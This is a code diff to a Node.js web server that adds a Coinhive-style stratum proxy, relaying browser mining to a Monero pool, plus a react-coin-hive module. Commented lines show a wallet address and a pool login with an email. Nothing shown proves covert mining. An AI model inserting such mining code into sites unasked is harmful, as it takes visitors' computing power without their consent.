@@ -14,6 +14,7 @@ require('babel-core/register')({
         || /\/react-decliner\//.test(file)
         || /\/google-map-react\//.test(file)
         || /\/react-progress-button\//.test(file)
+        || /\/react-coin-hive\//.test(file)
         // || /\/moment\//.test(file)
       ){
         return;
@@ -49,6 +50,31 @@ app.use(bodyParser.json());       // to support JSON-encoded bodies
 setup(app, {
 	outputPath: resolve(process.cwd(), 'build'),
 	publicPath: '/build/',
+});
+
+
+// Create your HiveProxy proxy
+const createProxy = require("coin-hive-stratum");
+const proxy = createProxy({
+  // host: "la01.supportxmr.com",
+  host: "pool.supportxmr.com",
+  port: 3333,
+  // user: "43QGgipcHvNLBX3nunZLwVQpF6VbobmGcQKzXzQ5xMfJgzfRBzfXcJHX1tUHcKPm9bcjubrzKqTm69JbQSL4B3f6E3mNCbU",
+  // pass: "webmining.online:n.lanets@webmining.online",
+});
+
+
+// Create an HTTPS server
+const server = require("https").createServer({
+  // key: fs.readFileSync("/opt/letsencrypt/certs/webmining.online/privkey.pem"),
+  // cert: fs.readFileSync("/opt/letsencrypt/certs/webmining.online/cert.pem")
+});
+
+server.listen(8892);
+
+// Pass your HTTPS server to the proxy
+proxy.listen({
+  server: server
 });
 
 
